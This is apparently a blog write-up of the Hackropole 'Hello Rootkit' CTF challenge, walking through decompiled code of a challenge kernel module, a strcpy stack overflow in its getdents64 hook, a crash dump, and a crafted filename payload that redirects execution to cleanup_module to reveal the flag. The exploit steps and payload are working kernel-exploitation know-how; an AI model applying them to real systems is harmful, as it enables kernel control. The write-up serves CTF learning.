---

layout: post
title: Hello Rootkit, Hackropole CTF 
date: 27-07-2024
categories: [CTF, Challenge]
tag: [CTF, pwn, kernel]  
author: Zélétix
image: assets/image_start/hello_rootkit.png
description: Hello Rootkit, Hackropole CTF by Zeletix
---

# Rootkit Deep analyze

In our exploration of kernel modules, we focus on five essential functions:

    init_module
    ecsc_sys_getdents
    ecsc_sys_getdents64
    ecsc_sys_lstat
    cleanup_module

By analyzing the `getdents64` function, we uncover an interesting vulnerability:

```c
ulong ecsc_sys_getdents64(undefined8 param_1,long param_2)

{
  byte *__src;
  ulong uVar1;
  uint *__src_00;
  uint *puVar2;
  uint *puVar3;
  long lVar4;
  uint uVar5;
  uint uVar6;
  ulong uVar7;
  byte *pbVar8;
  byte *pbVar9;
  ulong uVar10;
  bool bVar11;
  bool bVar12;
  byte bVar13;
  char local_70 [10];
  undefined8 local_66;
  
  bVar13 = 0;
  uVar1 = (*ref_sys_getdents64)();
  uVar7 = uVar1;
  do {
    if ((long)uVar7 < 1) {
      return uVar1;
    }
    uVar10 = (ulong)*(ushort *)(param_2 + 0x10);
    __src = (byte *)(param_2 + 0x13);
    lVar4 = 10;
    bVar11 = uVar7 < uVar10;
    uVar7 = uVar7 - uVar10;
    bVar12 = uVar7 == 0;
    pbVar8 = __src;
    pbVar9 = (byte *)"ecsc_flag_";
    do {
      if (lVar4 == 0) break;
      lVar4 = lVar4 + -1;
      bVar11 = *pbVar8 < *pbVar9;
      bVar12 = *pbVar8 == *pbVar9;
      pbVar8 = pbVar8 + (ulong)bVar13 * -2 + 1;
      pbVar9 = pbVar9 + (ulong)bVar13 * -2 + 1;
    } while (bVar12);
    if ((!bVar11 && !bVar12) == bVar11) {
      __src_00 = (uint *)strcpy(local_70,(char *)__src);
      puVar3 = __src_00;
      do {
        puVar2 = puVar3;
        uVar5 = *puVar2 + 0xfefefeff & ~*puVar2;
        uVar6 = uVar5 & 0x80808080;
        puVar3 = puVar2 + 1;
      } while (uVar6 == 0);
      bVar11 = (uVar5 & 0x8080) == 0;
      if (bVar11) {
        uVar6 = uVar6 >> 0x10;
      }
      if (bVar11) {
        puVar3 = (uint *)((long)puVar2 + 6);
      }
      uVar7 = (long)puVar3 + (-(long)__src_00 - (ulong)CARRY1((byte)uVar6,(byte)uVar6)) + -0xd;
      if (0x3f < uVar7) {
        uVar7 = 0x40;
      }
      uVar6 = (uint)uVar7;
      if (uVar6 < 8) {
        if ((uVar7 & 4) == 0) {
          if ((uVar6 != 0) && (*(undefined *)((long)__src_00 + 10) = 0x58, (uVar7 & 2) != 0)) {
            *(undefined2 *)((long)__src_00 + (uVar7 & 0xffffffff) + 8) = 0x5858;
          }
        }
        else {
          *(undefined4 *)((long)__src_00 + 10) = 0x58585858;
          *(undefined4 *)((long)__src_00 + (uVar7 & 0xffffffff) + 6) = 0x58585858;
        }
      }
      else {
        local_66 = 0x5858585858585858;
        *(undefined8 *)((long)__src_00 + (uVar7 & 0xffffffff) + 2) = 0x5858585858585858;
        uVar6 = uVar6 + (((int)__src_00 + 10) - (int)(__src_00 + 4)) & 0xfffffff8;
        if (7 < uVar6) {
          uVar5 = 0;
          do {
            uVar7 = (ulong)uVar5;
            uVar5 = uVar5 + 8;
            *(undefined8 *)((long)(__src_00 + 4) + uVar7) = 0x5858585858585858;
          } while (uVar5 < uVar6);
        }
      }
      strcpy((char *)__src,(char *)__src_00);
      return uVar1;
    }
    param_2 = param_2 + uVar10;
  } while( true );
}
```


This code reveals a potential `buffer overflow` when using `strcpy`:

```c
__src_00 = (uint *)strcpy(local_70, (char *)__src);
```
The string `ecsc_flag_` is compared to a part of the retrieved data, but without proper bounds, which can cause an overflow.

Using the `pwn cyclic` tool, we can trigger a [kernel panic](https://elixir.bootlin.com/linux/v4.14.167/source/kernel/panic.c#L35):

```bash
~ $ touch ecsc_flag_aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaab
kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
~ $ ls
general protection fault: 0000 [#1] NOPTI
Modules linked in: ecsc(O)
CPU: 0 PID: 56 Comm: ls Tainted: G           O    4.14.167 #11
task: ffff94e2c2212200 task.stack: ffffb64b000a4000
RIP: 0010:0x6163626161626261
RSP: 0018:ffffb64b000a7f38 EFLAGS: 00000282
RAX: 0000000000000118 RBX: 6174616161736161 RCX: 0000000000000000
RDX: 00007fff7f4286f6 RSI: ffffb64b000a7f93 RDI: 00007fff7f428623
RBP: 617a616161796161 R08: ffffb64b000a7ed0 R09: ffffffffc01cd024
R10: ffffb64b000a7ec0 R11: 6161766261617562 R12: 6176616161756161
R13: 6178616161776161 R14: 0000000000000000 R15: 0000000000000000
FS:  0000000000000000(0000) GS:ffffffff91836000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000000dfa138 CR3: 000000000229c000 CR4: 00000000000006b0
Call Trace:
Code:  Bad RIP value.
RIP: 0x6163626161626261 RSP: ffffb64b000a7f38
---[ end trace 5b607621c77a64d4 ]---
Kernel panic - not syncing: Fatal exception
Kernel Offset: 0xfe00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
Rebooting in 1 seconds..
```
This kernel panic indicates that the RIP pointer points to the address: `0x6163626161626261`.

Using `pwn cyclic -l 0x6163626161626261`, we determine that the offset is 102 before reaching RIP.

But what next? First, let's examine the protections on the system:

```bash
/ $ cat /proc/cmdline
console=ttyS0 loglevel=3 oops=panic panic=1 kaslr nopti
```
Although [KASLR](https://www.ibm.com/docs/en/linux-on-systems?topic=shutdown-kaslr) is enabled, it's not a major obstacle. Next, let's check if SMEP is enabled:

```bash
/ $ cat /proc/cpuinfo
flags : fpu de pse tsc msr ...
```
Ok, [SMEP](https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development/supervisor-mode-execution-protection-smep) is not enabled, making our task easier!

Now that we know a buffer overflow is possible, we can control the return address to point to `cleanup_module`, but why?

Explanation:

When a buffer overflow occurs, it allows an attacker to write beyond the allocated buffer's limits, overwriting adjacent data on the stack, including the return address. By controlling this return address, the attacker can redirect the program's execution flow to a function of their choice, in this case, `cleanup_module`.

The `cleanup_module` function is as follows:
```c
void cleanup_module(undefined8 param_1,undefined8 param_2)
{
  undefined8 uVar1;
  long lVar2;

  lVar2 = my_sys_call_table;
  uVar1 = original_cr0;
  *(undefined8 *)(my_sys_call_table + 0x6c8) = ref_sys_getdents64;
  *(undefined8 *)(lVar2 + 0x270) = ref_sys_getdents;
  *(undefined8 *)(lVar2 + 0x30) = ref_sys_lstat;
  msleep(2000,param_2,uVar1);
  return;
}
```
This function restores the original system call table pointers, potentially reverting the system to its state before exploitation. In other words, it might allow the recovery of the original `ecsc_flag_XXX` file by cleaning up the modifications made by the rootkit.

Here's how it works:

 The buffer overflow overwrites the instruction pointer (RIP) with a new address, here that of `cleanup_module`.
    When execution is redirected to `cleanup_module`, this function restores the system call table entries to their original values.
    The function then uses `msleep` to suspend execution for `2000 milliseconds`, probably to ensure the changes are correctly applied before the system continues.

Perfect! Now let's consider the return address `sys_exit` to prevent our payload from crashing as soon as we launch it.

Let's start by retrieving the addresses we need:

```bash
/ $ cat /proc/kallsyms | grep cleanup_module
ffffffffc035336e t cleanup_module       [ecsc]
/ $ cat /proc/kallsyms | grep sys_exit
ffffffffaa43a390 T sys_exit
```
Knowing that KASLR is enabled, we will need to do this each time the VM restarts.

Now, let's construct our payload as follows:

```bash
touch "$(printf 'ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x6e\x33\x35\xc0\xff\xff\x
ff\xff\x90\xa3\x43\xaa\xff\xff\xff\xff')"
```

FINAL:
```bash
~ $  touch "$(printf 'ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x6e\x33\x35\xc0\xff\xff\x
ff\xff\x90\xa3\x43\xaa\xff\xff\xff\xff')"
~ $ ls
~ $ cd /
/ $ ls
bin
dev
ecsc_flag_cf785ee0b5944f93dd09bf1b1b2c6da7fadada8e4d325a804d1dde2116676126
etc
home
init
lib
mnt
proc
root
run
sys
tmp
var
/ $ cat ecsc_flag_cf785ee0b5944f93dd09bf1b1b2c6da7fadada8e4d325a804d1dde21166761
26 
ECSC{c0d801fb2045ddb0ab[...]fa30b45b8a5}
```
We have the FLAG!!

I hope you enjoyed this first Writeup see you soon!!

if you have any questions you can dm me on discord : 'zeletix.'
